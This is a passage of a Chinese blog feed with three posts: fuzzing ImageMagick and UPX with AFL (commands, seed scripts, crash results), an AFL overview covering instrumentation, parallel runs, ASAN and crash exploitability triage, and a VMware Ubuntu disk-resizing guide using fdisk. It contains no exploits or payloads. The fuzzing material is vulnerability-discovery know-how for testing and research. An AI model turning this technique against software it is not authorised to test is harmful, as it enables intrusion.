class="string">'utilities/magick convert '</span> + seed_in + <span class="string">' '</span> + seed_out)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Usage: '</span> + sys.argv[<span class="number">0</span>] + <span class="string">' origin_seeds_dir'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        origin_seeds_dir = sys.argv[<span class="number">1</span>]</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            os.mkdir(<span class="string">'seeds'</span>)</div><div class="line">            seeds_path = os.path.join(os.path.abspath(<span class="string">'.'</span>),<span class="string">'seeds'</span>)</div><div class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'all_format'</span>))</div><div class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'cmin'</span>))</div><div class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'tmin'</span>))</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'make dir fail!'</span></div><div class="line"></div><div class="line">        convert(origin_seeds_dir)</div><div class="line">        tmin()</div><div class="line">        cmin()</div></pre></td></tr></table></figure></p>
<h3 id="3）模糊测试"><a href="#3）模糊测试" class="headerlink" title="3）模糊测试"></a>3）模糊测试</h3><p>程序运行模型一般为以下形式：</p>
<blockquote>
<p>输入-&gt; 解析（Parse） -&gt; 处理(Process) -&gt; 数据组装(Reassemble) -&gt; 输出</p>
</blockquote>
<p>对于 ImageMagick 而言，其 identify 命令可用户获取图片的属性，只会进行解析；convert 可转换图像格式和大小，以及进行各种处理，如果将处理结果输出到 /dev/null 则不进行写操作，如果使用 <code>convert in.png out.jpg</code> 则可触发写，即可覆盖更多的代码。</p>
<p>使用不同命令参数也可以触发更多的代码。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">afl-fuzz -i input -o output ./magick convert @@ /dev/null</div><div class="line">afl-fuzz -i input -o output ./magick composite @@ /dev/null</div><div class="line">afl-fuzz -i input -o output ./magick compare @@ /dev/null</div><div class="line">afl-fuzz -i input -o output ./magick montage @@ /dev/null</div><div class="line">afl-fuzz -i input -o output ./magick identify @@ /dev/null</div></pre></td></tr></table></figure></p>
<p>接下来开始进行模糊测试，首先新建测试样本文件夹和测试结果文件夹，然后将前面得到的测试样本放入 image_input 文件夹中，最后使用以下命令同时运行多个 fuzzer。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ mkdir input output</div><div class="line"></div><div class="line">$ afl-fuzz -i input/min_input -o output -M fuzzer01 -t 4000 -m 200 ./vultarget/ImageMagick/utilities/magick  convert @@  out.jpg</div><div class="line">$ afl-fuzz -i input/min_input -o output -S fuzzer02 -t 4000 -m 200 ./vultarget/ImageMagick/utilities/magick  convert @@  out.jpg</div><div class="line">$ afl-fuzz -i input/min_input -o output -S fuzzer03 -t 4000 -m 200 ./vultarget/ImageMagick/utilities/magick  convert @@  out.jpg</div></pre></td></tr></table></figure></p>
<p>afl-fuzz 参数说明：</p>
<ul>
<li>-i：指定测试样本所在目录；</li>
<li>-o：指定测试结果存放目录；</li>
<li>-M：运行主(Master) Fuzzer；</li>
<li>-S：运行从属(Slave) Fuzzer；</li>
<li>-t：设置程序运行超时值，单位为 ms；</li>
<li>-m：最大运行内存，单位为 MB；</li>
</ul>
<p>测试过程中，需要注意的是 ImageMagick 在运行时会在 /tmp 目录下生成大量的临时文件，使得磁盘空间爆满，最终会导致 afl-fuzz 停止运行。为保证 afl-fuzz 能正常运行，需要使用以下脚本删除这些临时文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        file_list = os.listdir(<span class="string">'/tmp'</span>)</div><div class="line"></div><div class="line">        <span class="keyword">for</span> file_index <span class="keyword">in</span> file_list:</div><div class="line">            <span class="keyword">if</span> file_index.startswith(<span class="string">'magick'</span>):</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    os.remove(<span class="string">'/tmp/'</span> + file_index)</div><div class="line">                <span class="keyword">except</span>:</div><div class="line">                    <span class="keyword">pass</span></div><div class="line">        time.sleep(<span class="number">10</span>)</div></pre></td></tr></table></figure></p>
<p>运行三个 fuzzer 同时跑了 1 天 18 小时之后发现了一个 2  crash。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-22/66936998.jpg" alt="">  </p>
<h2 id="3-测试-UPX"><a href="#3-测试-UPX" class="headerlink" title="3. 测试 UPX"></a>3. 测试 UPX</h2><h3 id="1）安装-UPX"><a href="#1）安装-UPX" class="headerlink" title="1）安装 UPX"></a>1）安装 UPX</h3><p>首先获取 upx 的源码，默认分支的版本为 3.94，修改编译选项：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ git <span class="built_in">clone</span> https://github.com/upx/upx.git</div><div class="line">$ <span class="built_in">cd</span> upx</div><div class="line">$ vim Makefile</div><div class="line">$ CC = /usr/<span class="built_in">local</span>/bin/afl-gcc   <span class="comment"># 添加该语句</span></div><div class="line">$ <span class="built_in">cd</span> upx</div><div class="line">$ vim Makefile</div><div class="line">$ CXX    ?= /usr/<span class="built_in">local</span>/bin/afl-g++   <span class="comment"># 修改 CXX</span></div></pre></td></tr></table></figure></p>
<p>执行以下语句获取 lzma-sdk。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git submodule update --init --recursive</div></pre></td></tr></table></figure></p>
<p>此外，还需要下载安装 <a href="http://www.oberhumer.com/opensource/ucl/" target="_blank" rel="external">UCL</a>，并设置环境变量 。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> ucl-1.03</div><div class="line">$ ./configure</div><div class="line">$ make</div><div class="line">$ sudo make install</div><div class="line">$ <span class="built_in">export</span> UPX_UCLDIR=/path/to/ucl-1.03</div></pre></td></tr></table></figure></p>
<p>最后编译 upx，编译完后在 /src 目录下会生成可执行文件 upx.out。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ make all</div></pre></td></tr></table></figure></p>
<h3 id="2）模糊测试-1"><a href="#2）模糊测试-1" class="headerlink" title="2）模糊测试"></a>2）模糊测试</h3><p>编译完后进行模糊测试。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ mkdir upx_in upx_out</div><div class="line">$ cp /bin/touch upx_in</div><div class="line">$ afl-fuzz -i upx_in -o upx_out -m 300 -t 300000 -- vultarget/upx/src/upx.out @@</div></pre></td></tr></table></figure></p>
<p>afl-fuzz 跑了一段时间后，发现了 11 个 crashes(upx 3.94)。对 crashes 分析后发现只有一个样例可触发 bug，但是该 bug 已经在 3.95 中<a href="https://github.com/upx/upx/commit/3931cb7871a9cabf63e7c91bcb685bac2e72c22b" target="_blank" rel="external">修复</a>了。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-22/94579623.jpg" alt=""><br>使用以下命令可切换到最新版本所在的分支，从中可看到 bug 已被修复。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git checkout devel</div></pre></td></tr></table></figure></p>
<h1 id="0x03-Fuzz-技巧"><a href="#0x03-Fuzz-技巧" class="headerlink" title="0x03 Fuzz 技巧"></a>0x03 Fuzz 技巧</h1><ul>
<li>在开源项目提交漏洞的 issue 里能看到这些漏洞是怎么发现的，以及还能收集一些样本，可参考这些方法进行 Fuzz。</li>
<li>对于开源项目，分析源码与 Fuzz 是相辅相成的，通过分析源码可找到合适的 Fuzz 入口和构造高质量的 Fuzz 样本。</li>
<li>Fuzz 时可设置一些功能选项可提高代码覆盖率。</li>
<li>模糊测试文件和网络协议等高度结构化数据时，通过构造合适的字典可提高代码覆盖率。</li>
</ul>
<hr>
<p>References:<br>[1] <a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="external">american fuzzy lop (2.52b)</a><br>[2] <a href="http://files.meetup.com/17933012/2015-03-introduction-fuzzing-with-afl.pdf" target="_blank" rel="external">AFL–American Fuzzy Lop</a><br>[3] <a href="https://github.com/lcatro/Fuzzing-ImageMagick/blob/master/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Fuzzing%E6%8C%96%E6%8E%98ImageMagick%E7%9A%84%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="external">如何使用Fuzzing挖掘ImageMagick的漏洞</a><br>[4] <a href="https://github.com/lcatro/How-to-Read-Source-and-Fuzzing/blob/master/2.Fuzzing%20%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%95%B0%E6%8D%AE%E8%BE%93%E5%85%A5.md" target="_blank" rel="external">Fuzzing 模糊测试之数据输入</a>  </p>
]]></content>
      
        <categories>
            
            <category> Fuzz </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[American Fuzzy Lop]]></title>
      <url>/2018/0722/american-fuzzy-lop/</url>
      <content type="html"><![CDATA[<p>AFL 是一种安全导向的模糊测试工具，它采用一种新型的编译时插桩和遗传算法来自动生成测试样本，使用这些样本可触发目标二进制程序中新的内部状态，从而可提高模糊测试的代码覆盖率。与其他插桩模糊测试工具相比，afl-fuzz 的设计更具有实用性：具有适度的性能开销，使用各种高效的模糊策略，配置简单，并能够处理复杂的实际使用案例（比如常见的图像解析或文件压缩库）。</p>
<h1 id="0x01-American-Fuzzy-Lop"><a href="#0x01-American-Fuzzy-Lop" class="headerlink" title="0x01 American Fuzzy Lop"></a>0x01 American Fuzzy Lop</h1><h2 id="1-导向性-Fuzz"><a href="#1-导向性-Fuzz" class="headerlink" title="1. 导向性 Fuzz"></a>1. 导向性 Fuzz</h2><p>fuzzer 生成测试样例的盲目性和随机性导致模糊测试只能找到浅层代码中的漏洞，由于无法抵达被测程序的某些代码路径，使得一些漏洞无法使用 fuzzer 找到。</p>
<p>目前已有大量的方法试图解决对于该问题。最早的方案是由 Tavis Ormandy 提出的语料库提蒸馏法（corpus distillation），该方案根据覆盖率信息从大量的种子中选取感兴趣的种子得到一个高质量的语料库，然后通过传统的方法利用这些高质量的语料库对目标程序进行模糊测试。该方案有较好的效果，但需要有较好的语料库。此外， 代码覆盖率也只是衡量程序执行状态的一个简单化的度量，对于长期模糊测试的引导作用较小。</p>
<p>另外，更复杂的研究主要包括动态符号执行（concolic execution）、符号执行和静态分析。这些技术在实验环境下具有很好的前景，但在实际应用中存在可靠性和性能问题。因此，目前还没有一个较好的方案能替代 “dumb” fuzzing 技术。</p>
<h2 id="2-afl-fuzz-算法"><a href="#2-afl-fuzz-算法" class="headerlink" title="2. afl-fuzz 算法"></a>2. afl-fuzz 算法</h2><p>AFL 是一款基于插桩引导和遗传算法的模糊测试器，并使用边缘覆盖（edge coverage）来获取程序控制流（CFG）的变化。AFL 算法如下：</p>
<ul>
<li>1）加载初始测试用例到队列；</li>
<li>2）从队列中获取下一个输入文件；</li>
<li>3）在不改变程序行为的前提下，尝试修剪测试用例，最小化其 size；</li>
<li>4）使用传统的模糊策略重复变异文件；</li>
<li>5）若通过插桩检测到变异后的文件能触发新的状态转换，则将该变异文件加入队列；</li>
<li>6）回到 2 执行。</li>
</ul>
<p>对于找到的测试样例，也会周期性地用更新的、高覆盖率的测试样例进行替换。</p>
<h2 id="3-插桩目标程序"><a href="#3-插桩目标程序" class="headerlink" title="3. 插桩目标程序"></a>3. 插桩目标程序</h2><p>有源码的情况下，可使用 gcc 或 clang 编译时进行插桩。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ CC=/path/to/afl/afl-gcc ./configure  <span class="comment"># for C program</span></div><div class="line">$ CXX=/path/to/afl/afl-g++ ./configure   <span class="comment"># for C++ program</span></div><div class="line">$ make clean all</div></pre></td></tr></table></figure></p>
<p>为了方便测试 lib 库中程序，可使用静态编译的方法将库编译到可执行文件中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CC=/path/to/afl/afl-gcc ./configure --disable-shared</div><div class="line">make</div></pre></td></tr></table></figure></p>
<p>此外，编译时设置 <code>AFL_HARDEN=1</code> 选项可用于检测简单的内存溢出漏洞，方便对 crash 样本的分析，具体可看  notes_for_asan.txt。</p>
<p>只有二进制程序的情况下，可以使用 QEMU 进行插桩。该功能开启方法如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ sudo apt install libtool-bin</div><div class="line">$ <span class="built_in">cd</span> qemu_mode</div><div class="line">$ ./build_qemu_support.sh</div></pre></td></tr></table></figure></p>
<h2 id="4-选择初始测试用例"><a href="#4-选择初始测试用例" class="headerlink" title="4. 选择初始测试用例"></a>4. 选择初始测试用例</h2><p>测试样例的选择应遵循以下原则：</p>
<ul>
<li>文件尽量小。小于 1 kb 的文件是理想的。</li>
<li>只有在每个测试用例都能驱动程序中的不同功能的情况下，才有必要使用多个测试用例。</li>
</ul>
<p>注：如果测似样例语料库较大，可以使用 afl-cmin 识别能触发程序走不同功能代码的文件，得到有效的样本集。</p>
<h2 id="5-Fuzzing-目标程序"><a href="#5-Fuzzing-目标程序" class="headerlink" title="5. Fuzzing 目标程序"></a>5. Fuzzing 目标程序</h2><p>对于从 stdin 中获取输入的目标程序，使用以下方法进行测试：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [...params...]</div></pre></td></tr></table></figure></p>
<p>对于从文件中获取输入的目标程序，使用 ‘@@’ 作为输入文件的占位符，afl-fuzz 会自动使用测试样本目录下的文件进行替换。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</div></pre></td></tr></table></figure></p>
<p>参数说明：</p>
<ul>
<li>-i：指定输入样例所在的目录；</li>
<li>-o：指定输出结果的存放目录；</li>
<li>-Q ：指定对未插桩程序进行 QEMU Fuzz 模式；</li>
<li>-n：指定对未插桩程序进行传统的 blind Fuzz 模式；</li>
<li>-m：设置程序执行的内存限制；</li>
<li>-t：设置程序执行的超时；</li>
<li>-d：quick &amp; dirty 模式。</li>
</ul>
<p>Fuzz 性能优化可参看 perf_tips.txt。</p>
<h2 id="6-结果输出"><a href="#6-结果输出" class="headerlink" title="6. 结果输出"></a>6. 结果输出</h2><p>在输出结果目录中有 3 个子目录：</p>
<ul>
<li>queue：能覆盖不同执行路径的所有测试样例。在使用这些测试样例前，可使用 afl-cmin 筛选出更有代表性的样例。</li>
<li>crashes：存放能触发被测试程序 crash 的样例。</li>
<li>hangs：存放可导致被测试程序超时的样例。</li>
</ul>
<p>使用 afl-min 最小化测试样例集：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./afl-tmin -i test_case -o minimized_result -- /path/to/program [...]</div></pre></td></tr></table></figure></p>
<p>使用以下命令可继续已停止的测试任务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./afl-fuzz -i- -o existing_output_dir [...etc...]</div></pre></td></tr></table></figure></p>
<p>注：</p>
<ul>
<li>通过 afl-plot 可生成<a href="http://lcamtuf.coredump.cx/afl/plot/" target="_blank" rel="external">测试图</a>。</li>
<li>使用 <a href="https://github.com/mrash/afl-cov" target="_blank" rel="external">afl-cov</a> 可获得测试用例的代码覆盖率。</li>
</ul>
<h2 id="7-并行测试"><a href="#7-并行测试" class="headerlink" title="7. 并行测试"></a>7. 并行测试</h2><p>每个 afl-fuzz 实例只占用一个 cpu 核，在多核系统中使用并行化测试可提高对硬件的利用率（使用 afl-gotcpu 可查看 CPU 的使用状态）。此外，并行 Fuzzing 模式还提供简单的接口给其他的测试工具，包括符号执行引擎。</p>
<p>在搭载多核 CPU 的系统中可同时运行多个测试实例。首先使用 -M 参数启动一个主实例（Master）。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01 [...other stuff...]</div></pre></td></tr></table></figure></p>
<p>接着，使用 -S 运行多个从属实例（Slave）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02 [...other stuff...]</div><div class="line">$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03 [...other stuff...]</div></pre></td></tr></table></figure></p>
<p>所有测试实例共享同一个输出文件夹 sync_dir，同时每个测试实例使用单独的文件（ path/to/sync_dir/fuzzer01/）夹存放其运行状态。每个测试实例会周期性地扫描 sync_dir 目录下由其它测试实例生成的用例，并将有用的样例加入到自己的样例集中。</p>
<p>使用 afl-whatsup 可监控 afl-fuzz 的运行状态，当测试实例无法找到新的路径时将会被终止运行。其它内容可参考 paralled_fuzzing.txt。</p>
<h2 id="8-测试字典"><a href="#8-测试字典" class="headerlink" title="8. 测试字典"></a>8. 测试字典</h2><p>默认情况下，afl-fuzz 变异引擎适用于紧凑数据格式 - 例如，图像，多媒体，压缩数据，正则表达式语法或 shell 脚本。它不太适合特别繁琐和冗长的语言 - 包括HTML，SQL或 JavaScript。</p>
<p>afl-fuzz 支持在测试过程中使用字典，字典中为语言的关键字、magic headers 或其他一些与目标数据类型相关的符号。使用 -x 选项可使用该功能。</p>
<h2 id="9-Crash-分类"><a href="#9-Crash-分类" class="headerlink" title="9. Crash 分类"></a>9. Crash 分类</h2><p>在得到崩溃样例之后，需要评估其可利用性。使用 -C 选项可开启 afl-fuzz 的 <code>crash exploration</code> 模式，该模式下，fuzzer 使用崩溃样例作为输入，输出的样例集为可以快速检查攻击者可控制错误地址被控制的程度。</p>
<p>此外，还可以使用 GDB 插件 <a href="https://github.com/jfoote/exploitable" target="_blank" rel="external">exploitable</a> 判断 crash 是否可利用。</p>
<p><a href="https://github.com/google/sanitizers" target="_blank" rel="external">Address Sanitizer(ASAN)</a> 是强大的内存检测工具，它可检测出缓存区溢出、UAF 等内存漏洞，编译时可使用以下选项开启 Address Sanitizer。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">AFL_USE_ASAN=1 ./configure CC=afl-gcc CXX=afl-g++ LD=afl-gcc--disable-shared</div><div class="line">AFL_USE_ASAN=1 make</div></pre></td></tr></table></figure></p>
<p>afl-fuzz 测试编译时开启 Address Sanitizer 的程序会大大减慢测试速度，但可以发现更多 bug。</p>
<p>不使用 AFL 编译插桩时，可使用以下方式开启 Address Sanitizer。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./configure CC=gcc CXX=g++ CFLAGS=<span class="string">"-g -fsanitize=address"</span></div><div class="line">make</div></pre></td></tr></table></figure></p>
<h1 id="0x02-性能优化"><a href="#0x02-性能优化" class="headerlink" title="0x02 性能优化"></a>0x02 性能优化</h1><p>当模糊测试速度太慢时，可通过以下方式优化测试性能，提高测试速度。<br><strong>1.  测试样例尽量小</strong></p>
<p><strong>2. 使用 LLVM 插桩</strong><br>使用 LLVM 插桩可得到 2 倍的性能提升。 LLVM 插桩的程序可支持 <code>persistent</code> 和 <code>deferred fork server</code> 模式，使用这两种模式也能使性能提升。</p>
<p><strong>3. 使用并行化测试</strong><br>每个 fuzzer 只需要一个内核，因此，在一个 4 核的计算机上可以同时开启 4 个 fuzzer。</p>
<p><strong>3. 控制内存使用和超时</strong><br>使用 -t 选项可设定程序运行的超时值；有些程序会花费大量时间用于分配和初始化内存，使用 -m 选项可限定内存使用大小。</p>
<hr>
<p>References:<br>[1] <a href="http://lcamtuf.coredump.cx/afl/README.txt" target="_blank" rel="external">american fuzzy lop</a><br>[2] <a href="https://github.com/ThalesIgnite/afl-training" target="_blank" rel="external">afl-training</a>  </p>
]]></content>
      
        <categories>
            
            <category> Fuzz </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VMWare 中扩展 ubuntu 磁盘空间]]></title>
      <url>/2018/0707/extend-ubuntu-disk-space-in-vmware/</url>
      <content type="html"><![CDATA[<p>由于在 VMWare 系统中使用 ubuntu 时安装的软件过多，导致磁盘空间不够用。因此，需要扩展虚拟机的磁盘空间，依照网上找到的方法可完成该过程，便记录在此。</p>
<h1 id="0x01-VMWare-设置"><a href="#0x01-VMWare-设置" class="headerlink" title="0x01 VMWare 设置"></a>0x01 VMWare 设置</h1><p>将需要扩展空间的虚拟机关机，并且需删除该虚拟机的快照。之后点击 <code>虚拟机/设置/硬盘/扩展</code>，设置扩展后的容量，这里从 20G 扩展到 40G。</p>
<p>设置完后，开启虚拟机，发现扩展的空间仍无法使用。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">sudo fdisk <span class="_">-l</span></div><div class="line">Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors</div><div class="line">Units: sectors of 1 * 512 = 512 bytes</div><div class="line">Sector size (logical/physical): 512 bytes / 512 bytes</div><div class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</div><div class="line">Disklabel <span class="built_in">type</span>: dos</div><div class="line">Disk identifier: 0xbaa4ad2e</div><div class="line"></div><div class="line">Device     Boot    Start      End  Sectors Size Id Type</div><div class="line">/dev/sda1  *        2048 33554431 33552384  16G 83 Linux</div><div class="line">/dev/sda2       33556478 41940991  8384514   4G  5 Extended</div><div class="line">/dev/sda5       33556480 41940991  8384512   4G 82 Linux swap / Solaris</div></pre></td></tr></table></figure></p>
<h1 id="0x02-重新分区"><a href="#0x02-重新分区" class="headerlink" title="0x02 重新分区"></a>0x02 重新分区</h1><p>为了能正常使用增加的磁盘容量，需把分区删除，然后再重新进行分区。首先关闭交换分区：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ubuntu<span class="comment"># swapoff -a</span></div><div class="line">ubuntu<span class="comment"># free -m</span></div><div class="line">              total        used        free      shared  buff/cache   available</div><div class="line">Mem:           3921         634        2414          11         872        2925</div><div class="line">Swap:             0           0           0</div></pre></td></tr></table></figure></p>
<p>删除 /dev/sda1 和 /dev/sda2 分区。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">ubuntu<span class="comment"># fdisk /dev/sda</span></div><div class="line"></div><div class="line">Welcome to fdisk (util-linux 2.27.1).</div><div class="line">Changes will remain <span class="keyword">in</span> memory only, until you decide to write them.</div><div class="line">Be careful before using the write command.</div><div class="line"></div><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p</div><div class="line">Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors</div><div class="line">Units: sectors of 1 * 512 = 512 bytes</div><div class="line">Sector size (logical/physical): 512 bytes / 512 bytes</div><div class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</div><div class="line">Disklabel <span class="built_in">type</span>: dos</div><div class="line">Disk identifier: 0xbaa4ad2e</div><div class="line"></div><div class="line">Device     Boot    Start      End  Sectors Size Id Type</div><div class="line">/dev/sda1  *        2048 33554431 33552384  16G 83 Linux</div><div class="line">/dev/sda2       33556478 41940991  8384514   4G  5 Extended</div><div class="line">/dev/sda5       33556480 41940991  8384512   4G 82 Linux swap / Solaris</div><div class="line"></div><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): d</div><div class="line">Partition number (1,2,5, default 5): 1</div><div class="line"></div><div class="line">Partition 1 has been deleted.</div><div class="line"></div><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): d</div><div class="line">Partition number (2,5, default 5): 2</div><div class="line"></div><div class="line">Partition 2 has been deleted.</div><div class="line"></div><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p</div><div class="line">Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors</div><div class="line">Units: sectors of 1 * 512 = 512 bytes</div><div class="line">Sector size (logical/physical): 512 bytes / 512 bytes</div><div class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</div><div class="line">Disklabel <span class="built_in">type</span>: dos</div><div class="line">Disk identifier: 0xbaa4ad2e</div></pre></td></tr></table></figure></p>
<p>删除分区后，重新进行分区。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</div><div class="line">Partition <span class="built_in">type</span></div><div class="line">   p   primary (0 primary, 0 extended, 4 free)</div><div class="line">   e   extended (container <span class="keyword">for</span> logical partitions)</div><div class="line">Select (default p): p</div><div class="line">Partition number (1-4, default 1): 1</div><div class="line">First sector (2048-83886079, default 2048): </div><div class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (2048-83886079, default 83886079): 75501568</div><div class="line"></div><div class="line">Created a new partition 1 of <span class="built_in">type</span> <span class="string">'Linux'</span> and of size 36 GiB.</div></pre></td></tr></table></figure></p>
<p>First sector 使用默认值，Last sector 的值设置为 75501568，根据上面 <code>free -m</code> 输出的信息计算：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">75501568 = 83886080(total sectors) - 8384512(swap sectors)</div></pre></td></tr></table></figure></p>
<p>可以看到已经新建了一个 36G 的 /dev/sda1 分区。接着继续分区：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</div><div class="line">Partition <span class="built_in">type</span></div><div class="line">   p   primary (1 primary, 0 extended, 3 free)</div><div class="line">   e   extended (container <span class="keyword">for</span> logical partitions)</div><div class="line">Select (default p): p</div><div class="line">Partition number (2-4, default 2): 2</div><div class="line">First sector (75501569-83886079, default 75503616): </div><div class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (75503616-83886079, default 83886079): </div><div class="line"></div><div class="line">Created a new partition 2 of <span class="built_in">type</span> <span class="string">'Linux'</span> and of size 4 GiB.</div><div class="line"></div><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p</div><div class="line">Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors</div><div class="line">Units: sectors of 1 * 512 = 512 bytes</div><div class="line">Sector size (logical/physical): 512 bytes / 512 bytes</div><div class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</div><div class="line">Disklabel <span class="built_in">type</span>: dos</div><div 